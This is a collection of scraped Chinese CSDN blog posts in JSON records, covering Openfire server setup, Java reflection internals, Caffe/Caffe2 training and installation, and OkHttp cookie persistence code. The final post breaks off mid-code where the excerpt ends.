{"timestamp": "2018_08_14_11_13_11", "desc": "源码配置完成后，输入http://127.0.0.1:9090/即可打开Openfire服务器后台管理页。\n设置语言。点击Continue，建议配置时切勿选择中文，否则后面的配置中可能会出现乱码。\n\n图1.png\n\n服务器配置。这里将XMPP Domain Name与Server Host Name保持默认设置， Secure Admin Console Port设置为9090， Property Encryption Key设置为admin，点击Continue。\n\n图2.png\n\n数据库设置。直接点击Continue。\n\n图3.png\n\n数据库配置。此处数据库我使用的是MySQL，选好MySQL后JDBC Driver Class 与 Database URL自动填充，但需要将Database URL(\"jdbc:mysql://[host-name]:3306/[database-name]?rewriteBatchedStatements=true\")中的[host-name]替换为本地数据库或者远程数据库，如果是本地数据库替换为localhost等均可，如果为远程数据库则需要设置为ip地址；[database-name]需要更改为自己创建的数据库名称，此处我创建的数据库名为openfire。Username与Password是连接数据库的用户名和密码，其余不变，点击Continue。\n\n图4.png\n\n配置文件设置。 直接点击Continue。\n\n图5.png\n\n\n管理员账户设置。 Admin Email Address为管理员邮箱，New Password为新密码，Confirm Password确认密码。点击Continue。当然你也可以直接跳过这一页，点击右下角的Skip This Step。\n\n图6.png\n\n\n设置完成。出现这样的页面，Openfire的配置就算是完成了。\n\n图7.png\n\n\n接下来点击 Login to the admin console。登录到管理员的控制台。\nusername是admin，password是admin，点击Login即可登录成功。\n\n图8.png\n\n\n\n登录成功页面\n\n图9.png\n\n\n如果想要重新配置Openfire服务器，将openfire_src\\target\\目录下的openfire文件夹全部删除即可。", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/mazaiting/article/details/78129628", "title": "Openfire服务器配置"}
{"timestamp": "2018_08_14_11_13_11", "desc": "从一段示例代码开始\n\n\n\n        Class clz = Class.forName(\"ClassA\");\n        Object instance = clz.newInstance();\n        Method method = clz.getMethod(\"myMethod\", String.class);\n        method.invoke(instance, \"abc\",\"efg\");\n\n前两行实现了类的装载、链接和初始化（newInstance方法实际上也是使用反射调用了<init>方法），后两行实现了从class对象中获取到method对象然后执行反射调用。试想一下，如果Method.invoke方法内，动态拼接成如下代码，转化成JVM能运行的字节码，就可以实现反射调用了。\n\n\n\n     public Object invoke(Object obj, Object[] param){\n        MyClass instance=(MyClass)obj;\n        return instance.myMethod(param[0],param[1],...);\n     }\n\n\n\nClass和Method对象\n\nClass对象里维护着该类的所有Method，Field，Constructor的cache，这份cache也可以被称作根对象。每次getMethod获取到的Method对象都持有对根对象的引用，因为一些重量级的Method的成员变量（主要是MethodAccessor），我们不希望每次创建Method对象都要重新初始化，于是所有代表同一个方法的Method对象都共享着根对象的MethodAccessor，每一次创建都会调用根对象的copy方法复制一份：\n\n\n\n    Method copy() { \n        Method res = new Method(clazz, name, parameterTypes, returnType,\n                                exceptionTypes, modifiers, slot, signature,\n                                annotations, parameterAnnotations, annotationDefault);\n        res.root = this;\n        res.methodAccessor = methodAccessor;\n        return res;\n    }\n\n\n\n反射调用\n\n\n\n    public Object invoke(Object obj, Object... args)\n        throws IllegalAccessException, IllegalArgumentException,\n           InvocationTargetException\n    {\n        if (!override) {\n            if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {\n                Class<?> caller = Reflection.getCallerClass();\n                checkAccess(caller, clazz, obj, modifiers);\n            }\n        }\n        MethodAccessor ma = methodAccessor;             // read volatile\n        if (ma == null) {\n            ma = acquireMethodAccessor();\n        }\n        return ma.invoke(obj, args);\n    }\n\n调用Method.invoke之后，先进行访问权限检查，再获取MethodAccessor对象，并调用MethodAccessor.invoke方法。MethodAccessor被同名Method对象所共享，由ReflectionFactory创建。创建机制采用了一种名为inflation的方式（JDK1.4之后）：如果该方法的累计调用次数<=15，会创建出NativeMethodAccessorImpl，它的实现就是直接调用native方法实现反射；如果该方法的累计调用次数>15，会创建出由字节码组装而成的MethodAccessorImpl。（是否采用inflation和15这个数字都可以在jvm参数中调整）\n\n那么以示例的反射调用ClassA.myMethod(String,String)为例，生成MethodAccessorImpl类的字节码对应成Java代码如下：\n\n\n\npublic class GeneratedMethodAccessor1 extends MethodAccessorImpl {    \n    public Object invoke(Object obj, Object[] args)  throws Exception {\n        try {\n            MyClass target = (ClassA) obj;\n            String arg0 = (String) args[0];\n            String arg1 = (String) args[1];\n            target.myMethod(arg0,arg1);\n        } catch (Throwable t) {\n            throw new InvocationTargetException(t);\n        }\n    }\n}\n\n\n\n性能\n\n通过JNI调用native方法初始化更快，但对优化有阻碍作用。随着调用次数的增多，使用拼装出的字节码可以直接以Java调用的方式来实现反射，发挥了JIT的优化作用。\n\n那么为什么Java反射调用被普通的方法调用慢很多呢？我认为主要有以下三点原因：\n\n\n因为接口的通用性，Java的invoke方法是传object和object[]数组的。基本类型参数需要装箱和拆箱，产生大量额外的对象和内存开销，频繁促发GC。\n编译器难以对动态调用的代码提前做优化，比如方法内联。\n反射需要按名检索类和方法，有一定的时间开销。\n\n\n\n\n参考\n\n\nhttp://www.fanyilun.me/2015/10/29/Java%E5%8F%8D%E5%B0%84%E5%8E%9F%E7%90%86/\nhttp://rednaxelafx.iteye.com/blog/548536", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/TellH/article/details/70997628", "title": "浅谈Java反射的实现原理"}
{"timestamp": "2018_08_14_11_13_11", "desc": "Caffe2 Distributed Training分布式训练\n\nCaffe2 最重要的一个特点是，便于分布式训练，无须重构设计即可快速实现网络的伸缩.   \n\n进一步学习Caffe2分布式训练的例子，可参考SynchronousSGD， 该材料阐述了Caffe2的data_parallel_model设计规则.   \n\n\nGloo - 用于多机训练的通信库  \nNCLL - NVIDIA推出的多GPU通信的NCCL库\nRedis - 为了对分布式训练的节点进行有效管理， Caffe2采用NFS在节点间分享数据，或者采用Redis服务器来处理节点间的通信 \n\n\nCaffe2 提供的一个分布式训练实例resnet50_trainer中，可以在单个GPU上运行 resnet50_trainer脚本. 其中，训练数据需要先加载到 lmdb database， 或者LevelDB.  \n\n\n\n实例\n\n安装成功Caffe2后，分布式训练至少有一个GPU，多个GPU更适合体现其分布式特点. \n\n首先，训练数据库转换成lmdb database， 或LevelDB格式；\n\nresnet50_trainer.py说明：   \n\n\n\nusage: resnet50_trainer.py [-h] --train_data TRAIN_DATA \n                           [--test_data TEST_DATA] [--db_type DB_TYPE]\n                           [--gpus GPUS] [--num_gpus NUM_GPUS]\n                           [--num_channels NUM_CHANNELS]\n                           [--image_size IMAGE_SIZE] [--num_labels NUM_LABELS]\n                           [--batch_size BATCH_SIZE] [--epoch_size EPOCH_SIZE]\n                           [--num_epochs NUM_EPOCHS]\n                           [--base_learning_rate BASE_LEARNING_RATE]\n                           [--weight_decay WEIGHT_DECAY]\n                           [--num_shards NUM_SHARDS] [--shard_id SHARD_ID]\n                           [--run_id RUN_ID] [--redis_host REDIS_HOST]\n                           [--redis_port REDIS_PORT]\n                           [--file_store_path FILE_STORE_PATH]\n\n\n–train_data - 训练数据库的路径\n–test_data - 测试数据库的路径\n–db_type - lmdb或leveldb， 默认lmdb\n–gpus - GPU IDs列表，其中 0 为第一个GPU设备， 多个GPU用逗号’，’隔开\n–num_gpus - GPUs总数，或者gpus列表\n–num_channels - 颜色通道数，默认为3 \n–image_size - 输入图像的高和宽的像素值，假设宽和高一样，默认为227， 不能处理小尺寸的\n–num_labels - labels数，默认1000\n–batch_size - batch size，所有GPUs上的总和，默认32，增加GPUs可以增加其值\n–epoch_size - 每个epoch中图像数，默认1.5MM(1500000)，可以进行自定义\n–num_epochs - epochs数\n–base_learning_rate - 初始化学习率，默认0.1(基于256个batch size)\n–weight_decay - weight decay(L2 regularization)\n–num_shards - 分布式运行的机器数，默认1\n–shard_id - shard/node id，默认为0，下一个node为1，以此\n–run_id RUNID - 唯一运行码, e.g. uuid\n–redis_host - Redis服务器的host(for rendezvous)\n–redis_port - rendezvous的Redis端口\n–file_store_path - alternative to Redis, (NFS) path to shared directory to use for rendezvous temp files to coordinate between each shard/node\n\n\ntesting用到的参数： \n- 1. –train_data[必需] \n- 2. –db_type[默认lmdb] \n- 3. –num_gpus<#> [使用该方式，替代利用 –gpus列出各gpu的方式] \n- 4. –batch_size[默认为32] \n- 5. –test_data [可选]\n\n唯一一个必须要提供的参数是训练数据库. 其调用方式为，其它参数默认：\n\n\n\npython resnet50_trainer.py --train_data <location of lmdb training database>\n\n使用LevelDB：\n\n\n\npython resnet50_trainer.py --train_data <location of leveldb training database> --db_type leveldb\n\n默认batch_size均为32. 如果采用2个GPU，需要根据GPU数来增加batch_size，以更多的利用GPU显存，此时，batch_size=64：\n\n\n\npython resnet50_trainer.py --train_data <location of lmdb training database> --num_gpus 2 --batch_size 64\n\n增加一个GPU，可以加倍batch size，每各epoch的迭代数减半. \n\n采用 nvidia-smi查看GPU状态，* watch -n1 nvidia-smi*可在多个experiments时连续记录GPU状态.  \n\n加入 –test_data 参数，可以监督网络训练的效果，给出accuracy，便于分析收敛情况.  \n\n\n\n日志 Logging\n\n运行训练程序时，在同文件夹内会生成log文件，该文件记录了在不同参数时的状态. 比如，\n\n\n\nresnet50_gpu2_b64_L1000_lr0.10_v2_20170411_141617.log\n\n从该文件名可以得出： \n- –gpus 2 \n- –batch_size 64 \n- –num_labels 1000 \n- –base_learning_rate 0.10 \n以时间戳排列.\n\nlog文件中，记录的值有： \n- time_spent \n- cumulative_time_spent \n- input_count \n- cumulative_input_count \n- cumulative_batch_count \n- inputs_per_sec \n- accuracy \n- epoch \n- learning_rate \n- loss \n- test_accuracy[如果没有test data，该值默认为-1，反之，输出accuracy值]", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/zziahgf/article/details/72473303", "title": "Caffe2 - (二)Distributed Training分布式训练"}
{"timestamp": "2018_08_14_11_13_11", "desc": "接上篇：caffe增加自己的layer实战（下）–caffe学习（12） \n构造完函数后我们就要进入proto目录。编辑caffe.proto文件，构造我们的video_data_layer的输入参数。 \n找到：message LayerParameter { \n里面有很多类似： \noptional PythonParameter python_param = 130; \n我们要为自己的video_data_layer添加一个optional  \n如：\n\n\n\noptional VideoDataParameter video_data_param = 140;\n\n要保证后面的140不要与这里面的其他数字重复，保证是唯一的。 \n然后对这个输入参数写对应的message： \n像这样：\n\n\n\nmessage VideoDataParameter{\n  // Specify the data source.\n  optional string source = 1;\n  // Specify the batch size.\n  optional uint32 batch_size = 4;\n  // The rand_skip variable is for the data layer to skip a few data points\n  // to avoid all asynchronous sgd clients to start at the same point. The skip\n  // point would be set as rand_skip * rand(0,1). Note that rand_skip should not\n  // be larger than the number of keys in the leveldb.\n  optional uint32 rand_skip = 7 [default = 0];\n  // Whether or not ImageLayer should shuffle the list of files at every epoch.\n  optional bool shuffle = 8 [default = false];\n  // It will also resize images if new_height or new_width are not zero.\n  optional uint32 new_height = 9 [default = 0];\n  optional uint32 new_width = 10 [default = 0];\n  optional uint32 new_length = 11 [default = 1];\n  optional uint32 num_segments = 12 [default = 1];\n  // DEPRECATED. See TransformationParameter. For data pre-processing, we can do\n  // simple scaling and subtracting the data mean, if provided. Note that the\n  // mean subtraction is always carried out before scaling.\n  optional float scale = 2 [default = 1];\n  optional string mean_file = 3;\n  // DEPRECATED. See TransformationParameter. Specify if we would like to randomly\n  // crop an image.\n  optional uint32 crop_size = 5 [default = 0];\n  // DEPRECATED. See TransformationParameter. Specify if we want to randomly mirror\n  // data.\n  optional bool mirror = 6 [default = false];\n  enum Modality {\n    RGB = 0;\n    FLOW = 1;\n  }\n  optional Modality modality = 13 [default = FLOW];\n\n  // the name pattern for frame images,\n  // for RGB modality it is default to \"img_%04d.jpg\", for FLOW \"flow_x_%04d\" and \"flow_y_%04d\"\n  optional string name_pattern = 14;\n\n  // The type of input\n  optional bool encoded = 15 [default = false];\n}\n\n现在开始在就是对输入prototxt参数进行类型定义和默认值。 \n现在全部所需都完成了。 \n进入caffe目录 \nmake clean \nmake all -j8 \nmake install \n\n\n更新， \n最后也是最容易忽视的一点，在 Layer 工厂注册新 Layer 加工函数，不然在你运行过程中可能会报如下错误：\n\nF1002 01:51:22.656038 1954701312 layer_factory.hpp:81] Check failed: registry.count(type) == 1 (0 vs. 1) Unknown layer type: AllPass (known types: AbsVal, Accuracy, ArgMax, BNLL, BatchNorm, BatchReindex, Bias, Concat, ContrastiveLoss, Convolution, Crop, Data, Deconvolution, Dropout, DummyData, ELU, Eltwise, Embed, EuclideanLoss, Exp, Filter, Flatten, HDF5Data, HDF5Output, HingeLoss, Im2col, ImageData, InfogainLoss, InnerProduct, Input, LRN, Log, MVN, MemoryData, MultinomialLogisticLoss, PReLU, Pooling, Power, ReLU, Reduction, Reshape, SPP, Scale, Sigmoid, SigmoidCrossEntropyLoss, Silence, Slice, Softmax, SoftmaxWithLoss, Split, TanH, Threshold, Tile, WindowData) *** Check failure stack trace: *** @ 0x10243154e google::LogMessage::Fail() @ 0x102430c53 google::LogMessage::SendToLog() @ 0x1024311a9 google::LogMessage::Flush() @ 0x1024344d7 google::LogMessageFatal::~LogMessageFatal() @ 0x10243183b google::LogMessageFatal::~LogMessageFatal() @ 0x102215356 caffe::LayerRegistry<>::CreateLayer() @ 0x102233ccf caffe::Net<>::Init() @ 0x102235996 caffe::Net<>::Net() @ 0x102118d8b time() @ 0x102119c9a main @ 0x7fff851285ad start @ 0x4 (unknown) Abort trap: 6\n\n主要错误提示是：Check failed: registry.count(type) == 1 (0 vs. 1) Unknown layer type: VideoDataLayer \n解决办法：\n\n全部成功以后 \n新建一个train.prototxt文件，用最简单的LeNet网络做测试。\n\nname: \"LeNet\"\nlayer {\n  name: \"data\"\n  type: \"VideoData\"\n  top: \"data\"\n  top: \"label\"\n  video_data_param {\n    source: \"data/hmdb51_rgb_train_split_1.txt\"\n    batch_size: 32\n    new_length: 1\n    num_segments: 3\n    modality: RGB\n    shuffle: true\n    name_pattern: \"img_%05d.jpg\"\n  }\n  transform_param{\n    crop_size: 224\n    mirror: true\n    fix_crop: true\n    more_fix_crop: true\n    multi_scale: true\n    max_distort: 1\n    scale_ratios:[1,.875,.75, .66]\n    is_flow: false\n    mean_value: [104, 117, 123, 104, 117, 123, 104, 117, 123]\n  }\n  include: { phase: TRAIN }\n}\nlayer { name: \"reshape_data\" type: \"Reshape\" bottom: \"data\" top: \"reshape_data\" reshape_param { shape { dim: -1 dim: 3 dim: 224 dim: 224 } } }\n\n\n\n\nlayer {\n  name: \"conv1\"\n  type: \"Convolution\"\n  bottom: \"data\"\n  top: \"conv1\"\n  param {\n    lr_mult: 1\n  }\n  param {\n    lr_mult: 2\n  }\n  convolution_param {\n    num_output: 20\n    kernel_size: 5\n    stride: 1\n    weight_filler {\n      type: \"xavier\"\n    }\n    bias_filler {\n      type: \"constant\"\n    }\n  }\n}\nlayer {\n  name: \"pool1\"\n  type: \"Pooling\"\n  bottom: \"conv1\"\n  top: \"pool1\"\n  pooling_param {\n    pool: MAX\n    kernel_size: 2\n    stride: 2\n  }\n}\nlayer {\n  name: \"conv2\"\n  type: \"Convolution\"\n  bottom: \"pool1\"\n  top: \"conv2\"\n  param {\n    lr_mult: 1\n  }\n  param {\n    lr_mult: 2\n  }\n  convolution_param {\n    num_output: 50\n    kernel_size: 5\n    stride: 1\n    weight_filler {\n      type: \"xavier\"\n    }\n    bias_filler {\n      type: \"constant\"\n    }\n  }\n}\nlayer {\n  name: \"pool2\"\n  type: \"Pooling\"\n  bottom: \"conv2\"\n  top: \"pool2\"\n  pooling_param {\n    pool: MAX\n    kernel_size: 2\n    stride: 2\n  }\n}\nlayer {\n  name: \"ip1\"\n  type: \"InnerProduct\"\n  bottom: \"pool2\"\n  top: \"ip1\"\n  param {\n    lr_mult: 1\n  }\n  param {\n    lr_mult: 2\n  }\n  inner_product_param {\n    num_output: 500\n    weight_filler {\n      type: \"xavier\"\n    }\n    bias_filler {\n      type: \"constant\"\n    }\n  }\n}\nlayer {\n  name: \"relu1\"\n  type: \"ReLU\"\n  bottom: \"ip1\"\n  top: \"ip1\"\n}\nlayer {\n  name: \"ip2\"\n  type: \"InnerProduct\"\n  bottom: \"ip1\"\n  top: \"ip2\"\n  param {\n    lr_mult: 1\n  }\n  param {\n    lr_mult: 2\n  }\n  inner_product_param {\n    num_output: 10\n    weight_filler {\n      type: \"xavier\"\n    }\n    bias_filler {\n      type: \"constant\"\n    }\n  }\n}\nlayer {\n  name: \"prob\"\n  type: \"Softmax\"\n  bottom: \"ip2\"\n  top: \"prob\"\n}\n\n\n\n上面的source: \"data/hmdb51_rgb_train_split_1.txt\"\n\n文件内容如下：\n\n\n\ndata/Sara_beim_Rauchen_-_Volume_3_smoke_h_cm_np1_fr_med_0 77 0\n\n这里我们只拿一个视频进行测试 \n数据在链接：http://pan.baidu.com/s/1eSMHquu 密码：06e4", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/u014381600/article/details/54289697", "title": "caffe增加自己的layer实战（下-续1）--caffe学习（13）"}
{"timestamp": "2018_08_14_11_13_11", "desc": "本人是在VMware虚拟机ubuntu14.04下安装caffe，仅CPU模式， CUDA 版本为7.5。下载地址 \n特别注意CUDA7.5支持的Linux版本如图\n\n在虚拟机下安装caffe的缺点就是不能使用主机的GPU，只能安装CPU only模式，与在双系统使用GPU安装区别在于不用安装CUDA的显卡驱动和相应的库，运行时需要将相应的设置改为CPU only而已！\n\n下面的开始安装： \n1·下载CUDA下载地址 \n下载caffe：全部下载 \n2·在终端下更新必要的环境：\n\n\n\nsudo apt-get update #更新软件列表\nsudo apt-get upgrade #更新软件   \nsudo apt-get install build-essential #安装build essentials  \nsudo apt-get install linux-headers-`uname -r`   #安装kernel headers\n\n3·切换到CUDA下载目录执行，sudo sh cuda_7.5.18_linux.run会开始出现CUDA的提示，这里的英文要注意看，如果直接提示不支持你的系统版本的话后面的就别做了，吗，没什么提示就直接： \naccept \n下一步选n \n下一步y \n下一步y \n一路enter到结束 \n \n安装结束更新必要的库路径\n\n\n\necho 'export PATH=/usr/local/cuda/bin:$PATH' >> ~/.bashrc\necho 'export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/lib64:/usr/local/lib' >> ~/.bashrc  \nsource ~/.bashrc \n\nsudo apt-get install -y libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libboost-all-dev libhdf5-serial-dev protobuf-compiler gfortran libjpeg62 libfreeimage-dev libatlas-base-dev git python-dev python-pip libgoogle-glog-dev libbz2-dev libxml2-dev libxslt-dev libffi-dev libssl-dev libgflags-dev liblmdb-dev python-yaml  \nsudo easy_install pillow  \n\n4·切换到caffe下载目录执行\n\n\n\ncd caffe目录\ncat python/requirements.txt | xargs -L 1 sudo pip install  #这里的requirements.txt里面是caffe需要的库目录，因此要下载很久，很久的等待就好\n\n上一步下载玩caffe的requirements.txt之后就可以执行：\n\n\n\nsudo ln -s /usr/include/python2.7/ /usr/local/include/python2.7  \nsudo ln -s /usr/local/lib/python2.7/dist-packages/numpy/core/include/numpy/ /usr/local/include/python2.7/numpy  \n#软连接是为了caffe调用python\n\n5·修改makefile \ncaffe目录下的Makefile.config.example复制为Makefile.config\n\n\n\ncp Makefile.config.example Makefile.config  \n#下面修改Makefile.config\nsudo vi Makefile.config\n#去掉 # CPU_ONLY: = 1 的注释 （也就是去掉前面的#号）\n\n \n继续修改其中PYTHON_INCLUDE项目： \n把\n\n\n\n/usr/lib/python2.7/dist-packages/numpy/core/include  \n\n改为\n\n\n\n/usr/local/lib/python2.7/dist-packages/numpy/core/include  \n\n \n6·下面可以正式开始编译caffe：\n\n\n\nmake pycaffe &&make all&&make test  \n\n中间没有什么error的话caffe就安装成功了。\n\n7·测试caffe \n7.1进入caffe/python目录测试\n\n\n\npython #进入python\nimport caffe #不出错就是成功\n\n7.2用官方的测试集测试： \n编辑examples/mnist文件夹下的lenet_solver.prototxt文件，将solver_mode模式从GPU改为CPU\n\n\n\n./examples/mnist/train_lenet.sh   #能够开始训练的话就成功了", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/u014381600/article/details/51926632", "title": "Vmware虚拟机安装caffe，Ubuntu安装caffe,CPU only版本"}
{"timestamp": "2018_08_14_11_13_11", "desc": "对于Okhttp和Okhttp3分别有两种方法持久化cookie \n\n\n\nOkhttp持久化\n\n\n\n我们可以CookieManager来持久化，我们需要手动创建PersistentCookieStore类实现CookieStore接口，如下：\n\n\n\npackage com.app.test.brigdeproject.cookiemanage;\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.text.TextUtils;\nimport android.util.Log;\n\nimport java.io.*;\nimport java.net.CookieStore;\nimport java.net.HttpCookie;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.*;\nimport java.util.concurrent.ConcurrentHashMap;\n\n/**\n * A persistent cookie store which implements the Apache HttpClient CookieStore interface.\n * Cookies are stored and will persist on the user's device between application sessions since they\n * are serialized and stored in SharedPreferences. Instances of this class are\n * designed to be used with AsyncHttpClient#setCookieStore, but can also be used with a\n * regular old apache HttpClient/HttpContext if you prefer.\n */\n/**\n * Created by ${liumengqiang} on 2017/8/9.\n */\npublic class PersistentCookieStore implements CookieStore {\n\n    private static final String LOG_TAG = \"PersistentCookieStore\";\n    private static final String COOKIE_PREFS = \"CookiePrefsFile\";\n    private static final String COOKIE_NAME_PREFIX = \"cookie_\";\n\n    private final HashMap<String, ConcurrentHashMap<String, HttpCookie>> cookies;\n    private final SharedPreferences cookiePrefs;\n\n    /**\n     * Construct a persistent cookie store.\n     *\n     * @param context Context to attach cookie store to\n     */\n    public PersistentCookieStore(Context context) {\n        cookiePrefs = context.getSharedPreferences(COOKIE_PREFS, 0);\n        cookies = new HashMap<String, ConcurrentHashMap<String, HttpCookie>>();\n\n        // Load any previously stored cookies into the store\n        Map<String, ?> prefsMap = cookiePrefs.getAll();\n        for(Map.Entry<String, ?> entry : prefsMap.entrySet()) {\n            if (((String)entry.getValue()) != null && !((String)entry.getValue()).startsWith(COOKIE_NAME_PREFIX)) {\n                String[] cookieNames = TextUtils.split((String)entry.getValue(), \",\");\n                for (String name : cookieNames) {\n                    String encodedCookie = cookiePrefs.getString(COOKIE_NAME_PREFIX + name, null);\n                    if (encodedCookie != null) {\n                        HttpCookie decodedCookie = decodeCookie(encodedCookie);\n                        if (decodedCookie != null) {\n                            if(!cookies.containsKey(entry.getKey()))\n                                cookies.put(entry.getKey(), new ConcurrentHashMap<String, HttpCookie>());\n                            cookies.get(entry.getKey()).put(name, decodedCookie);\n                        }\n                    }\n                }\n\n            }\n        }\n    }\n\n    @Override\n    public void add(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        // Save cookie into local store, or remove if expired\n        if (!cookie.hasExpired()) {\n            if(!cookies.containsKey(uri.getHost()))\n                cookies.put(uri.getHost(), new ConcurrentHashMap<String, HttpCookie>());\n            cookies.get(uri.getHost()).put(name, cookie);\n        } else {\n            if(cookies.containsKey(uri.toString()))\n                cookies.get(uri.getHost()).remove(name);\n        }\n\n        // Save cookie into persistent store\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n        prefsWriter.putString(COOKIE_NAME_PREFIX + name, encodeCookie(new SerializableHttpCookie(cookie)));\n        prefsWriter.commit();\n    }\n\n    protected String getCookieToken(URI uri, HttpCookie cookie) {\n        return cookie.getName() + cookie.getDomain();\n    }\n\n    @Override\n    public List<HttpCookie> get(URI uri) {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        if(cookies.containsKey(uri.getHost()))\n            ret.addAll(cookies.get(uri.getHost()).values());\n        return ret;\n    }\n\n    @Override\n    public boolean removeAll() {\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.clear();\n        prefsWriter.commit();\n        cookies.clear();\n        return true;\n    }\n\n\n    @Override\n    public boolean remove(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        if(cookies.containsKey(uri.getHost()) && cookies.get(uri.getHost()).containsKey(name)) {\n            cookies.get(uri.getHost()).remove(name);\n\n            SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n            if(cookiePrefs.contains(COOKIE_NAME_PREFIX + name)) {\n                prefsWriter.remove(COOKIE_NAME_PREFIX + name);\n            }\n            prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n            prefsWriter.commit();\n\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public List<HttpCookie> getCookies() {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        for (String key : cookies.keySet())\n            ret.addAll(cookies.get(key).values());\n\n        return ret;\n    }\n\n    @Override\n    public List<URI> getURIs() {\n        ArrayList<URI> ret = new ArrayList<URI>();\n        for (String key : cookies.keySet())\n            try {\n                ret.add(new URI(key));\n            } catch (URISyntaxException e) {\n                e.printStackTrace();\n            }\n\n        return ret;\n    }\n\n    /**\n     * Serializes Cookie object into String\n     *\n     * @param cookie cookie to be encoded, can be null\n     * @return cookie encoded as String\n     */\n    protected String encodeCookie(SerializableHttpCookie cookie) {\n        if (cookie == null)\n            return null;\n        ByteArrayOutputStream os = new ByteArrayOutputStream();\n        try {\n            ObjectOutputStream outputStream = new ObjectOutputStream(os);\n            outputStream.writeObject(cookie);\n        } catch (IOException e) {\n            Log.d(LOG_TAG, \"IOException in encodeCookie\", e);\n            return null;\n        }\n\n        return byteArrayToHexString(os.toByteArray());\n    }\n\n    /**\n     * Returns cookie decoded from cookie string\n     *\n     * @param cookieString string of cookie as returned from http request\n     * @return decoded cookie or null if exception occured\n     */\n    protected HttpCookie decodeCookie(String cookieString) {\n        byte[] bytes = hexStringToByteArray(cookieString);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        HttpCookie cookie = null;\n        try {\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n            cookie = ((SerializableHttpCookie) objectInputStream.readObject()).getCookie();\n        } catch (IOException e) {\n            Log.d(LOG_TAG, \"IOException in decodeCookie\", e);\n        } catch (ClassNotFoundException e) {\n            Log.d(LOG_TAG, \"ClassNotFoundException in decodeCookie\", e);\n        }\n\n        return cookie;\n    }\n\n    /**\n     * Using some super basic byte array &lt;-&gt; hex conversions so we don't have to rely on any\n     * large Base64 libraries. Can be overridden if you like!\n     *\n     * @param bytes byte array to be converted\n     * @return string containing hex values\n     */\n    protected String byteArrayToHexString(byte[] bytes) {\n        StringBuilder sb = new StringBuilder(bytes.length * 2);\n        for (byte element : bytes) {\n            int v = element & 0xff;\n            if (v < 16) {\n                sb.append('0');\n            }\n            sb.append(Integer.toHexString(v));\n        }\n        return sb.toString().toUpperCase(Locale.US);\n    }\n\n    /**\n     * Converts hex values from strings to byte arra\n     *\n     * @param hexString string of hex-encoded values\n     * @return decoded byte array\n     */\n    protected byte[] hexStringToByteArray(String hexString) {\n        int len = hexString.length();\n        byte[] data = new byte[len / 2];\n        for (int i = 0; i < len; i += 2) {\n            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4) + Character.digit(hexString.charAt(i + 1), 16));\n        }\n        return data;\n    }\n\n\n}\n\n然后就是创建SerializableHttpCookie实现序列化接口：\n\n\n\npackage com.app.test.brigdeproject.cookiemanage;\n\n/**\n * Created by ${liumengqiang} on 2017/8/9.\n */\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\nimport java.net.HttpCookie;\n\npublic class SerializableHttpCookie implements Serializable {\n    private static final long serialVersionUID = 6374381323722046732L;\n\n    private transient final HttpCookie cookie;\n    private transient HttpCookie clientCookie;\n\n    public SerializableHttpCookie(HttpCookie cookie) {\n        this.cookie = cookie;\n    }\n\n    public HttpCookie getCookie() {\n        HttpCookie bestCookie = cookie;\n        if (clientCookie != null) {\n            bestCookie = clientCookie;\n        }\n        return bestCookie;\n    }\n\n    private void writeObject(ObjectOutputStream out) throws IOException {\n        out.writeObject(cookie.getName());\n        out.writeObject(cookie.getValue());\n        out.writeObject(cookie.getComment());\n        out.writeObject(cookie.getCommentURL());\n        out.writeObject(cookie.getDomain());\n        out.writeLong(cookie.getMaxAge());\n        out.writeObject(cookie.getPath());\n        out.writeObject(cookie.getPortlist());\n        out.writeInt(cookie.getVersion());\n        out.writeBoolean(cookie.getSecure());\n        out.writeBoolean(cookie.getDiscard());\n    }\n\n    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {\n        String name = (String) in.readObject();\n        String value = (String) in.readObject();\n        clientCookie = new HttpCookie(name, value);\n        clientCookie.setComment((String) in.readObject());\n        clientCookie.setCommentURL((String) in.readObject());\n        clientCookie.setDomain((String) in.readObject());\n        clientCookie.setMaxAge(in.readLong());\n        clientCookie.setPath((String) in.readObject());\n        clientCookie.setPortlist((String) in.readObject());\n        clientCookie.setVersion(in.readInt());\n        clientCookie.setSecure(in.readBoolean());\n        clientCookie.setDiscard(in.readBoolean());\n    }\n}\n\n此时只要在代码中调用即可：\n\n\n\n okHttpClient.setCookieHandler(new CookieManager(\n                new PersistentCookieStore(context), CookiePolicy.ACCEPT_ALL));\n\n\n\nOkhttp3持久化\n\n对于OKhttp3封装的都很好了 ，首先在app gradle中添加如下代码：\n\n\n\n    compile 'com.github.franmontiel:PersistentCookieJar:v1.0.1'\n\n如果添加库失败的话，可以在你的工程build中添加如下代码：\n\n\n\nallprojects {\n    repositories {\n        jcenter()\n        maven { url \"https://jitpack.io\" }\n    }\n}\n\n然后 我们：\n\nPersistentCookieJar cookieJar = new PersistentCookieJar(new SetCookieCache(), new                             SharedPrefsCookiePersistor(getApplicationContext()));\n\n然后cookieJar\n\n\n\nOkHttpClient okHttpClient = new OkHttpClient.Builder()\n                .cookieJar(cookieJar)\n                